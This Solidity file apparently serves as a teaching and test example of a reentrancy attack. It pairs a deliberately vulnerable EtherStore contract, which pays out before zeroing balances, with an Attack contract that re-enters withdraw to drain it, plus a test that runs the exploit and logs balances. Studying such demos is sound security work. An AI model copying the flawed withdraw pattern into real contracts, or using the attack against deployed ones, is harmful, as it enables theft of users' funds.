// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "template/ds_test_common.sol";

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Either receive or fallback is called when EtherStore sends Ether to this contract.
    // fallback() external payable {
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    // Must NOT have a receive function here if fallback() is used

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract reentrancy_exploit_Test is DSCommon {
    using SafeMath for uint256;

    // ----------------------------------------------------------------------------
    // Reentrancy Exploit #1
    // ----------------------------------------------------------------------------
    function test__reentrancy_1() public {
        EtherStore hackMe = new EtherStore();
        Attack attacker = new Attack(address(hackMe));

        // Transfer ETH to the contracts
        hackMe.deposit{value: 10 ether}();

        emit log_named_decimal_uint(
            "[Start] Smart_Contract ETH balance before exploit",
            address(this).balance,
            18
        );

        emit log_named_decimal_uint(
            "[Start] hackMe ETH balance before exploit",
            hackMe.getBalance(),
            18
        );

        emit log_named_decimal_uint(
            "[Start] Attacker ETH balance before exploit",
            attacker.getBalance(),
            18
        );

        // Attack
        attacker.attack{value: 1 ether}();

        emit log_named_decimal_uint(
            "[End] Smart_Contract ETH balance after exploit",
            address(this).balance,
            18
        );

        emit log_named_decimal_uint(
            "[End] hackMe ETH balance after exploit",
            hackMe.getBalance(),
            18
        );

        emit log_named_decimal_uint(
            "[End] Attacker ETH balance after exploit",
            attacker.getBalance(),
            18
        );
    }
}
